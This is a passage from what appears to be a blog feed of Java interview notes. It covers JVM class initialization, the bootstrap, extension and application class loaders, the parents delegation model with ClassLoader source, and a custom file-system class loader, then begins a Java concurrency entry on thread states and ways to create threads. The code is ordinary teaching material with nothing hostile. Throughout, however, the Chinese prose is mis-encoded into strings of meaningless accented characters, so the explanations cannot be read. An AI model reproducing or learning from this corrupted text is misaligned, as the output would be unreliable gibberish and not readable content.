åœ¨å‡†å¤‡é˜¶æ®µï¼Œç±»å˜é‡å·²ç»èµ‹è¿‡ä¸€æ¬¡ç³»ç»Ÿè¦æ±‚çš„åˆå§‹å€¼ï¼Œè€Œåœ¨åˆå§‹åŒ–é˜¶æ®µï¼Œæ ¹æ®ç¨‹åºå‘˜é€šè¿‡ç¨‹åºåˆ¶å®šçš„ä¸»è§‚è®¡åˆ’å»åˆå§‹åŒ–ç±»å˜é‡å’Œå…¶å®ƒèµ„æºã€‚ &lt;clinit&gt;() æ–¹æ³•å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š æ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ”¶é›†ç±»ä¸­æ‰€æœ‰ç±»å˜é‡çš„èµ‹å€¼åŠ¨ä½œå’Œé™æ€è¯­å¥å—ï¼ˆstatic{} å—ï¼‰ä¸­çš„è¯­å¥åˆå¹¶äº§ç”Ÿçš„ï¼Œç¼–è¯‘å™¨æ”¶é›†çš„é¡ºåºç”±è¯­å¥åœ¨æºæ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºå†³å®šã€‚ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œé™æ€è¯­å¥å—åªèƒ½è®¿é—®åˆ°å®šä¹‰åœ¨å®ƒä¹‹å‰çš„ç±»å˜é‡ï¼Œå®šä¹‰åœ¨å®ƒä¹‹åçš„ç±»å˜é‡åªèƒ½èµ‹å€¼ï¼Œä¸èƒ½è®¿é—®ã€‚ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š 1234567public class Test &#123; static &#123; i = 0; // ç»™å˜é‡èµ‹å€¼å¯ä»¥æ­£å¸¸ç¼–è¯‘é€šè¿‡ System.out.print(i); // è¿™å¥ç¼–è¯‘å™¨ä¼šæç¤ºâ€œéæ³•å‘å‰å¼•ç”¨â€ &#125; static int i = 1;&#125; ä¸ç±»çš„æ„é€ å‡½æ•°ï¼ˆæˆ–è€…è¯´å®ä¾‹æ„é€ å™¨ &lt;init&gt;()ï¼‰ä¸åŒï¼Œä¸éœ€è¦æ˜¾å¼çš„è°ƒç”¨çˆ¶ç±»çš„æ„é€ å™¨ã€‚è™šæ‹Ÿæœºä¼šè‡ªåŠ¨ä¿è¯åœ¨å­ç±»çš„ &lt;clinit&gt;() æ–¹æ³•è¿è¡Œä¹‹å‰ï¼Œçˆ¶ç±»çš„ &lt;clinit&gt;() æ–¹æ³•å·²ç»æ‰§è¡Œç»“æŸã€‚å› æ­¤è™šæ‹Ÿæœºä¸­ç¬¬ä¸€ä¸ªæ‰§è¡Œ &lt;clinit&gt;() æ–¹æ³•çš„ç±»è‚¯å®šä¸º java.lang.Objectã€‚ ç”±äºçˆ¶ç±»çš„ &lt;clinit&gt;() æ–¹æ³•å…ˆæ‰§è¡Œï¼Œä¹Ÿå°±æ„å‘³ç€çˆ¶ç±»ä¸­å®šä¹‰çš„é™æ€è¯­å¥å—è¦ä¼˜äºå­ç±»çš„å˜é‡èµ‹å€¼æ“ä½œã€‚ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314static class Parent &#123; public static int A = 1; static &#123; A = 2; &#125;&#125;static class Sub extends Parent &#123; public static int B = A;&#125;public static void main(String[] args) &#123; System.out.println(Sub.B); // è¾“å‡ºç»“æœæ˜¯çˆ¶ç±»ä¸­çš„é™æ€å˜é‡ A çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ 2ã€‚&#125; &lt;clinit&gt;() æ–¹æ³•å¯¹äºç±»æˆ–æ¥å£ä¸æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœä¸€ä¸ªç±»ä¸­ä¸åŒ…å«é™æ€è¯­å¥å—ï¼Œä¹Ÿæ²¡æœ‰å¯¹ç±»å˜é‡çš„èµ‹å€¼æ“ä½œï¼Œç¼–è¯‘å™¨å¯ä»¥ä¸ä¸ºè¯¥ç±»ç”Ÿæˆ &lt;clinit&gt;() æ–¹æ³•ã€‚ æ¥å£ä¸­ä¸å¯ä»¥ä½¿ç”¨é™æ€è¯­å¥å—ï¼Œä½†ä»ç„¶æœ‰ç±»å˜é‡åˆå§‹åŒ–çš„èµ‹å€¼æ“ä½œï¼Œå› æ­¤æ¥å£ä¸ç±»ä¸€æ ·éƒ½ä¼šç”Ÿæˆ &lt;clinit&gt;() æ–¹æ³•ã€‚ä½†æ¥å£ä¸ç±»ä¸åŒçš„æ˜¯ï¼Œæ‰§è¡Œæ¥å£çš„ &lt;clinit&gt;() æ–¹æ³•ä¸éœ€è¦å…ˆæ‰§è¡Œçˆ¶æ¥å£çš„ &lt;clinit&gt;() æ–¹æ³•ã€‚åªæœ‰å½“çˆ¶æ¥å£ä¸­å®šä¹‰çš„å˜é‡ä½¿ç”¨æ—¶ï¼Œçˆ¶æ¥å£æ‰ä¼šåˆå§‹åŒ–ã€‚å¦å¤–ï¼Œæ¥å£çš„å®ç°ç±»åœ¨åˆå§‹åŒ–æ—¶ä¹Ÿä¸€æ ·ä¸ä¼šæ‰§è¡Œæ¥å£çš„ &lt;clinit&gt;() æ–¹æ³•ã€‚ è™šæ‹Ÿæœºä¼šä¿è¯ä¸€ä¸ªç±»çš„ &lt;clinit&gt;() æ–¹æ³•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹è¢«æ­£ç¡®çš„åŠ é”å’ŒåŒæ­¥ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œåªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè¿™ä¸ªç±»çš„ &lt;clinit&gt;() æ–¹æ³•ï¼Œå…¶å®ƒçº¿ç¨‹éƒ½ä¼šé˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æ´»åŠ¨çº¿ç¨‹æ‰§è¡Œ &lt;clinit&gt;() æ–¹æ³•å®Œæ¯•ã€‚å¦‚æœåœ¨ä¸€ä¸ªç±»çš„ &lt;clinit&gt;() æ–¹æ³•ä¸­æœ‰è€—æ—¶çš„æ“ä½œï¼Œå°±å¯èƒ½é€ æˆå¤šä¸ªçº¿ç¨‹é˜»å¡ï¼Œåœ¨å®é™…è¿‡ç¨‹ä¸­æ­¤ç§é˜»å¡å¾ˆéšè”½ã€‚ ç±»åŠ è½½å™¨åœ¨ Java è™šæ‹Ÿæœºå¤–éƒ¨å®ç°ï¼Œä»¥ä¾¿è®©åº”ç”¨ç¨‹åºè‡ªå·±å†³å®šå¦‚ä½•å»è·å–æ‰€éœ€è¦çš„ç±»ã€‚ 1. ç±»ä¸ç±»åŠ è½½å™¨ä¸¤ä¸ªç±»ç›¸ç­‰ï¼šç±»æœ¬èº«ç›¸ç­‰ï¼Œå¹¶ä¸”ä½¿ç”¨åŒä¸€ä¸ªç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ã€‚è¿™æ˜¯å› ä¸ºæ¯ä¸€ä¸ªç±»åŠ è½½å™¨éƒ½æ‹¥æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç±»åç§°ç©ºé—´ã€‚ è¿™é‡Œçš„ç›¸ç­‰ï¼ŒåŒ…æ‹¬ç±»çš„ Class å¯¹è±¡çš„ equals() æ–¹æ³•ã€isAssignableFrom() æ–¹æ³•ã€isInstance() æ–¹æ³•çš„è¿”å›ç»“æœä¸º trueï¼Œä¹ŸåŒ…æ‹¬ä½¿ç”¨ instanceof å…³é”®å­—åšå¯¹è±¡æ‰€å±å…³ç³»åˆ¤å®šç»“æœä¸º trueã€‚ 2. ç±»åŠ è½½å™¨åˆ†ç±»ä» Java è™šæ‹Ÿæœºçš„è§’åº¦æ¥è®²ï¼Œåªå­˜åœ¨ä»¥ä¸‹ä¸¤ç§ä¸åŒçš„ç±»åŠ è½½å™¨ï¼š å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap ClassLoaderï¼‰ï¼Œè¿™ä¸ªç±»åŠ è½½å™¨ç”¨ C++ å®ç°ï¼Œæ˜¯è™šæ‹Ÿæœºè‡ªèº«çš„ä¸€éƒ¨åˆ†ï¼› æ‰€æœ‰å…¶ä»–ç±»çš„åŠ è½½å™¨ï¼Œè¿™äº›ç±»ç”± Java å®ç°ï¼Œç‹¬ç«‹äºè™šæ‹Ÿæœºå¤–éƒ¨ï¼Œå¹¶ä¸”å…¨éƒ½ç»§æ‰¿è‡ªæŠ½è±¡ç±» java.lang.ClassLoaderã€‚ ä» Java å¼€å‘äººå‘˜çš„è§’åº¦çœ‹ï¼Œç±»åŠ è½½å™¨å¯ä»¥åˆ’åˆ†å¾—æ›´ç»†è‡´ä¸€äº›ï¼š å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap ClassLoaderï¼‰æ­¤ç±»åŠ è½½å™¨è´Ÿè´£å°†å­˜æ”¾åœ¨ &lt;JAVA_HOME&gt;\lib ç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢« -Xbootclasspath å‚æ•°æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„ï¼Œå¹¶ä¸”æ˜¯è™šæ‹Ÿæœºè¯†åˆ«çš„ï¼ˆä»…æŒ‰ç…§æ–‡ä»¶åè¯†åˆ«ï¼Œå¦‚ rt.jarï¼Œåå­—ä¸ç¬¦åˆçš„ç±»åº“å³ä½¿æ”¾åœ¨ lib ç›®å½•ä¸­ä¹Ÿä¸ä¼šè¢«åŠ è½½ï¼‰ç±»åº“åŠ è½½åˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­ã€‚å¯åŠ¨ç±»åŠ è½½å™¨æ— æ³•è¢« Java ç¨‹åºç›´æ¥å¼•ç”¨ï¼Œç”¨æˆ·åœ¨ç¼–å†™è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ—¶ï¼Œå¦‚æœéœ€è¦æŠŠåŠ è½½è¯·æ±‚å§”æ´¾ç»™å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œç›´æ¥ä½¿ç”¨ null ä»£æ›¿å³å¯ã€‚ æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtension ClassLoaderï¼‰è¿™ä¸ªç±»åŠ è½½å™¨æ˜¯ç”± ExtClassLoaderï¼ˆsun.misc.Launcher$ExtClassLoaderï¼‰å®ç°çš„ã€‚å®ƒè´Ÿè´£å°† &lt;JAVA_HOME&gt;/lib/ext æˆ–è€…è¢« java.ext.dir ç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šè·¯å¾„ä¸­çš„æ‰€æœ‰ç±»åº“åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨æ‰©å±•ç±»åŠ è½½å™¨ã€‚ åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ï¼ˆApplication ClassLoaderï¼‰è¿™ä¸ªç±»åŠ è½½å™¨æ˜¯ç”± AppClassLoaderï¼ˆsun.misc.Launcher$AppClassLoaderï¼‰å®ç°çš„ã€‚ç”±äºè¿™ä¸ªç±»åŠ è½½å™¨æ˜¯ ClassLoader ä¸­çš„ getSystemClassLoader() æ–¹æ³•çš„è¿”å›å€¼ï¼Œå› æ­¤ä¸€èˆ¬ç§°ä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ã€‚å®ƒè´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„ï¼ˆClassPathï¼‰ä¸Šæ‰€æŒ‡å®šçš„ç±»åº“ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªç±»åŠ è½½å™¨ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è‡ªå®šä¹‰è¿‡è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸ªå°±æ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚ 3. åŒäº²å§”æ´¾æ¨¡å‹åº”ç”¨ç¨‹åºéƒ½æ˜¯ç”±ä¸‰ç§ç±»åŠ è½½å™¨ç›¸äº’é…åˆè¿›è¡ŒåŠ è½½çš„ï¼Œå¦‚æœæœ‰å¿…è¦ï¼Œè¿˜å¯ä»¥åŠ å…¥è‡ªå·±å®šä¹‰çš„ç±»åŠ è½½å™¨ã€‚ ä¸‹å›¾å±•ç¤ºçš„ç±»åŠ è½½å™¨ä¹‹é—´çš„å±‚æ¬¡å…³ç³»ï¼Œç§°ä¸ºç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆParents Delegation Modelï¼‰ã€‚è¯¥æ¨¡å‹è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½åº”æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ã€‚è¿™é‡Œç±»åŠ è½½å™¨ä¹‹é—´çš„çˆ¶å­å…³ç³»ä¸€èˆ¬é€šè¿‡ç»„åˆï¼ˆCompositionï¼‰å…³ç³»æ¥å®ç°ï¼Œè€Œä¸æ˜¯é€šè¿‡ç»§æ‰¿ï¼ˆInheritanceï¼‰çš„å…³ç³»å®ç°ã€‚ ï¼ˆä¸€ï¼‰å·¥ä½œè¿‡ç¨‹ ä¸€ä¸ªç±»åŠ è½½å™¨é¦–å…ˆå°†ç±»åŠ è½½è¯·æ±‚ä¼ é€åˆ°çˆ¶ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•å®Œæˆç±»åŠ è½½è¯·æ±‚æ—¶æ‰å°è¯•åŠ è½½ã€‚ ï¼ˆäºŒï¼‰å¥½å¤„ ä½¿å¾— Java ç±»éšç€å®ƒçš„ç±»åŠ è½½å™¨ä¸€èµ·å…·æœ‰ä¸€ç§å¸¦æœ‰ä¼˜å…ˆçº§çš„å±‚æ¬¡å…³ç³»ï¼Œä»è€Œä½¿å¾—åŸºç¡€ç±»å¾—åˆ°ç»Ÿä¸€ã€‚ ä¾‹å¦‚ java.lang.Object å­˜æ”¾åœ¨ rt.jar ä¸­ï¼Œå¦‚æœç¼–å†™å¦å¤–ä¸€ä¸ª java.lang.Object çš„ç±»å¹¶æ”¾åˆ° ClassPath ä¸­ï¼Œç¨‹åºå¯ä»¥ç¼–è¯‘é€šè¿‡ã€‚å› ä¸ºåŒäº²å§”æ´¾æ¨¡å‹çš„å­˜åœ¨ï¼Œæ‰€ä»¥åœ¨ rt.jar ä¸­çš„ Object æ¯”åœ¨ ClassPath ä¸­çš„ Object ä¼˜å…ˆçº§æ›´é«˜ï¼Œå› ä¸º rt.jar ä¸­çš„ Object ä½¿ç”¨çš„æ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè€Œ ClassPath ä¸­çš„ Object ä½¿ç”¨çš„æ˜¯åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ã€‚æ­£å› ä¸º rt.jar ä¸­çš„ Object ä¼˜å…ˆçº§æ›´é«˜ï¼Œå› ä¸ºç¨‹åºä¸­æ‰€æœ‰çš„ Object éƒ½æ˜¯è¿™ä¸ª Objectã€‚ ï¼ˆä¸‰ï¼‰å®ç° ä»¥ä¸‹æ˜¯æŠ½è±¡ç±» java.lang.ClassLoader çš„ä»£ç ç‰‡æ®µï¼Œå…¶ä¸­çš„ loadClass() æ–¹æ³•è¿è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼šå…ˆæ£€æŸ¥ç±»æ˜¯å¦å·²ç»åŠ è½½è¿‡ï¼Œå¦‚æœæ²¡æœ‰åˆ™è®©çˆ¶ç±»åŠ è½½å™¨å»åŠ è½½ã€‚å½“çˆ¶ç±»åŠ è½½å™¨åŠ è½½å¤±è´¥æ—¶æŠ›å‡º ClassNotFoundExceptionï¼Œæ­¤æ—¶å°è¯•è‡ªå·±å»åŠ è½½ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041public abstract class ClassLoader &#123; // The parent class loader for delegation private final ClassLoader parent; public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; return loadClass(name, false); &#125; protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; try &#123; if (parent != null) &#123; c = parent.loadClass(name, false); &#125; else &#123; c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. c = findClass(name); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; throw new ClassNotFoundException(name); &#125;&#125; 4. è‡ªå®šä¹‰ç±»åŠ è½½å™¨å®ç°FileSystemClassLoader æ˜¯è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œç»§æ‰¿è‡ª java.lang.ClassLoaderï¼Œç”¨äºåŠ è½½æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ç±»ã€‚å®ƒé¦–å…ˆæ ¹æ®ç±»çš„å…¨ååœ¨æ–‡ä»¶ç³»ç»Ÿä¸ŠæŸ¥æ‰¾ç±»çš„å­—èŠ‚ä»£ç æ–‡ä»¶ï¼ˆ.class æ–‡ä»¶ï¼‰ï¼Œç„¶åè¯»å–è¯¥æ–‡ä»¶å†…å®¹ï¼Œæœ€åé€šè¿‡ defineClass() æ–¹æ³•æ¥æŠŠè¿™äº›å­—èŠ‚ä»£ç è½¬æ¢æˆ java.lang.Class ç±»çš„å®ä¾‹ã€‚ java.lang.ClassLoader çš„ loadClass() å®ç°äº†åŒäº²å§”æ´¾æ¨¡å‹çš„é€»è¾‘ï¼Œå› æ­¤è‡ªå®šä¹‰ç±»åŠ è½½å™¨ä¸€èˆ¬ä¸å»é‡å†™å®ƒï¼Œä½†æ˜¯éœ€è¦é‡å†™ findClass() æ–¹æ³•ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940public class FileSystemClassLoader extends ClassLoader &#123; private String rootDir; public FileSystemClassLoader(String rootDir) &#123; this.rootDir = rootDir; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootDir + File.separatorChar + className.replace('.', File.separatorChar) + ".class"; &#125;&#125; å‚è€ƒèµ„æ–™ å‘¨å¿—æ˜. æ·±å…¥ç†è§£ Java è™šæ‹Ÿæœº [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2011. Jvm memory Memory Architecture Of JVM(Runtime Data Areas) JVM Run-Time Data Areas Android on x86: Java Native Interface and the Android Native Development Kit æ·±å…¥ç†è§£ JVM(2)â€”â€”GC ç®—æ³•ä¸å†…å­˜åˆ†é…ç­–ç•¥ æ·±å…¥ç†è§£ JVM(3)â€”â€”7 ç§åƒåœ¾æ”¶é›†å™¨ JVM Internals æ·±å…¥æ¢è®¨ Java ç±»åŠ è½½å™¨ Guide to WeakHashMap in Java Tomcat example source code file (ConcurrentCache.java)]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java å¹¶å‘]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E5%B9%B6%E5%8F%91%2F</url>
    <content type="text"><![CDATA[ä¸€ã€çº¿ç¨‹çŠ¶æ€è½¬æ¢ æ–°å»ºï¼ˆNewï¼‰ å¯è¿è¡Œï¼ˆRunnableï¼‰ é˜»å¡ï¼ˆBlockingï¼‰ æ— é™æœŸç­‰å¾…ï¼ˆWaitingï¼‰ é™æœŸç­‰å¾…ï¼ˆTimed Waitingï¼‰ æ­»äº¡ï¼ˆTerminatedï¼‰ äºŒã€ä½¿ç”¨çº¿ç¨‹ å®ç° Runnable æ¥å£ å®ç° Callable æ¥å£ ç»§æ‰¿ Thread ç±» å®ç°æ¥å£ VS ç»§æ‰¿ Thread ä¸‰ã€åŸºç¡€çº¿ç¨‹æœºåˆ¶ Executor Daemon sleep() yield() å››ã€ä¸­æ–­ InterruptedException interrupted() Executor çš„ä¸­æ–­æ“ä½œ äº”ã€äº’æ–¥åŒæ­¥ synchronized ReentrantLock synchronized å’Œ ReentrantLock æ¯”è¾ƒ å…­ã€çº¿ç¨‹ä¹‹é—´çš„åä½œ join() wait() notify() notifyAll() await() signal() signalAll() ä¸ƒã€J.U.C - AQS CountdownLatch CyclicBarrier Semaphore å…«ã€J.U.C - å…¶å®ƒç»„ä»¶ FutureTask BlockingQueue ForkJoin ä¹ã€çº¿ç¨‹ä¸å®‰å…¨ç¤ºä¾‹ åã€Java å†…å­˜æ¨¡å‹ ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜ å†…å­˜é—´äº¤äº’æ“ä½œ å†…å­˜æ¨¡å‹ä¸‰å¤§ç‰¹æ€§ å…ˆè¡Œå‘ç”ŸåŸåˆ™ åä¸€ã€çº¿ç¨‹å®‰å…¨ çº¿ç¨‹å®‰å…¨å®šä¹‰ çº¿ç¨‹å®‰å…¨åˆ†ç±» çº¿ç¨‹å®‰å…¨çš„å®ç°æ–¹æ³• åäºŒã€é”ä¼˜åŒ– è‡ªæ—‹é” é”æ¶ˆé™¤ é”ç²—åŒ– è½»é‡çº§é” åå‘é” åä¸‰ã€å¤šçº¿ç¨‹å¼€å‘è‰¯å¥½çš„å®è·µ å‚è€ƒèµ„æ–™ ä¸€ã€çº¿ç¨‹çŠ¶æ€è½¬æ¢ æ–°å»ºï¼ˆNewï¼‰åˆ›å»ºåå°šæœªå¯åŠ¨ã€‚ å¯è¿è¡Œï¼ˆRunnableï¼‰å¯èƒ½æ­£åœ¨è¿è¡Œï¼Œä¹Ÿå¯èƒ½æ­£åœ¨ç­‰å¾… CPU æ—¶é—´ç‰‡ã€‚ åŒ…å«äº†æ“ä½œç³»ç»Ÿçº¿ç¨‹çŠ¶æ€ä¸­çš„ Running å’Œ Readyã€‚ é˜»å¡ï¼ˆBlockingï¼‰ç­‰å¾…è·å–ä¸€ä¸ªæ’å®ƒé”ï¼Œå¦‚æœå…¶çº¿ç¨‹é‡Šæ”¾äº†é”å°±ä¼šç»“æŸæ­¤çŠ¶æ€ã€‚ æ— é™æœŸç­‰å¾…ï¼ˆWaitingï¼‰ç­‰å¾…å…¶å®ƒçº¿ç¨‹æ˜¾å¼åœ°å”¤é†’ï¼Œå¦åˆ™ä¸ä¼šè¢«åˆ†é… CPU æ—¶é—´ç‰‡ã€‚ è¿›å…¥æ–¹æ³• é€€å‡ºæ–¹æ³• æ²¡æœ‰è®¾ç½® Timeout å‚æ•°çš„ Object.wait() æ–¹æ³• Object.notify() / Object.notifyAll() æ²¡æœ‰è®¾ç½® Timeout å‚æ•°çš„ Thread.join() æ–¹æ³• è¢«è°ƒç”¨çš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯• LockSupport.park() æ–¹æ³• - é™æœŸç­‰å¾…ï¼ˆTimed Waitingï¼‰æ— éœ€ç­‰å¾…å…¶å®ƒçº¿ç¨‹æ˜¾å¼åœ°å”¤é†’ï¼Œåœ¨ä¸€å®šæ—¶é—´ä¹‹åä¼šè¢«ç³»ç»Ÿè‡ªåŠ¨å”¤é†’ã€‚ è°ƒç”¨ Thread.sleep() æ–¹æ³•ä½¿çº¿ç¨‹è¿›å…¥é™æœŸç­‰å¾…çŠ¶æ€æ—¶ï¼Œå¸¸å¸¸ç”¨â€œä½¿ä¸€ä¸ªçº¿ç¨‹ç¡çœ â€è¿›è¡Œæè¿°ã€‚ è°ƒç”¨ Object.wait() æ–¹æ³•ä½¿çº¿ç¨‹è¿›å…¥é™æœŸç­‰å¾…æˆ–è€…æ— é™æœŸç­‰å¾…æ—¶ï¼Œå¸¸å¸¸ç”¨â€œæŒ‚èµ·ä¸€ä¸ªçº¿ç¨‹â€è¿›è¡Œæè¿°ã€‚ ç¡çœ å’ŒæŒ‚èµ·æ˜¯ç”¨æ¥æè¿°è¡Œä¸ºï¼Œè€Œé˜»å¡å’Œç­‰å¾…ç”¨æ¥æè¿°çŠ¶æ€ã€‚ é˜»å¡å’Œç­‰å¾…çš„åŒºåˆ«åœ¨äºï¼Œé˜»å¡æ˜¯è¢«åŠ¨çš„ï¼Œå®ƒæ˜¯åœ¨ç­‰å¾…è·å–ä¸€ä¸ªæ’å®ƒé”ã€‚è€Œç­‰å¾…æ˜¯ä¸»åŠ¨çš„ï¼Œé€šè¿‡è°ƒç”¨ Thread.sleep() å’Œ Object.wait() ç­‰æ–¹æ³•è¿›å…¥ã€‚ è¿›å…¥æ–¹æ³• é€€å‡ºæ–¹æ³• Thread.sleep() æ–¹æ³• æ—¶é—´ç»“æŸ è®¾ç½®äº† Timeout å‚æ•°çš„ Object.wait() æ–¹æ³• æ—¶é—´ç»“æŸ / Object.notify() / Object.notifyAll() è®¾ç½®äº† Timeout å‚æ•°çš„ Thread.join() æ–¹æ³• æ—¶é—´ç»“æŸ / è¢«è°ƒç”¨çš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯• LockSupport.parkNanos() æ–¹æ³• - LockSupport.parkUntil() æ–¹æ³• - æ­»äº¡ï¼ˆTerminatedï¼‰å¯ä»¥æ˜¯çº¿ç¨‹ç»“æŸä»»åŠ¡ä¹‹åè‡ªå·±ç»“æŸï¼Œæˆ–è€…äº§ç”Ÿäº†å¼‚å¸¸è€Œç»“æŸã€‚ äºŒã€ä½¿ç”¨çº¿ç¨‹æœ‰ä¸‰ç§ä½¿ç”¨çº¿ç¨‹çš„æ–¹æ³•ï¼š å®ç° Runnable æ¥å£ï¼› å®ç° Callable æ¥å£ï¼› ç»§æ‰¿ Thread ç±»ã€‚ å®ç° Runnable å’Œ Callable æ¥å£çš„ç±»åªèƒ½å½“åšä¸€ä¸ªå¯ä»¥åœ¨çº¿ç¨‹ä¸­è¿è¡Œçš„ä»»åŠ¡ï¼Œä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„çº¿ç¨‹ï¼Œå› æ­¤æœ€åè¿˜éœ€è¦é€šè¿‡ Thread æ¥è°ƒç”¨ã€‚å¯ä»¥è¯´ä»»åŠ¡æ˜¯é€šè¿‡çº¿ç¨‹é©±åŠ¨ä»è€Œæ‰§è¡Œçš„ã€‚ å®ç° Runnable æ¥å£éœ€è¦å®ç° run() æ–¹æ³•ã€‚ é€šè¿‡ Thread è°ƒç”¨ start() æ–¹æ³•æ¥å¯åŠ¨çº¿ç¨‹ã€‚ 12345public class MyRunnable implements Runnable &#123; public void run() &#123; // ... &#125;&#125; 12345public static void main(String[] args) &#123; MyRunnable instance = new MyRunnable(); Thread thread = new Thread(instance); thread.start();&#125; å®ç° Callable æ¥å£ä¸ Runnable ç›¸æ¯”ï¼ŒCallable å¯ä»¥æœ‰è¿”å›å€¼ï¼Œè¿”å›å€¼é€šè¿‡ FutureTask è¿›è¡Œå°è£…ã€‚ 12345public class MyCallable implements Callable&lt;Integer&gt; &#123; public Integer call() &#123; return 123; &#125;&#125; 1234567public static void main(String[] args) throws ExecutionException, InterruptedException &#123; MyCallable mc = new MyCallable(); FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(mc); Thread thread = new Thread(ft); thread.start(); System.out.println(ft.get());&#125; ç»§æ‰¿ Thread ç±»åŒæ ·ä¹Ÿæ˜¯éœ€è¦å®ç° run() æ–¹æ³•ï¼Œå› ä¸º Thread ç±»ä¹Ÿå®ç°äº† Runable æ¥å£ã€‚ 12345public class MyThread extends Thread &#123; public void run() &#123; // ... &#125;&#125; 1234public static void main(String[] args) &#123; MyThread mt = new MyThread(); mt.start();&#125; å®ç°æ¥å£ VS ç»§æ‰¿ Threadå®ç°æ¥å£ä¼šæ›´å¥½ä¸€äº›ï¼Œå› ä¸ºï¼š Java ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œå› æ­¤ç»§æ‰¿äº† Thread ç±»å°±æ— æ³•ç»§æ‰¿å…¶å®ƒç±»ï¼Œä½†æ˜¯å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼› ç±»å¯èƒ½åªè¦æ±‚å¯æ‰§è¡Œå°±è¡Œï¼Œç»§æ‰¿æ•´ä¸ª Thread ç±»å¼€é”€è¿‡å¤§ã€‚ ä¸‰ã€åŸºç¡€çº¿ç¨‹æœºåˆ¶ExecutorExecutor ç®¡ç†å¤šä¸ªå¼‚æ­¥ä»»åŠ¡çš„æ‰§è¡Œï¼Œè€Œæ— 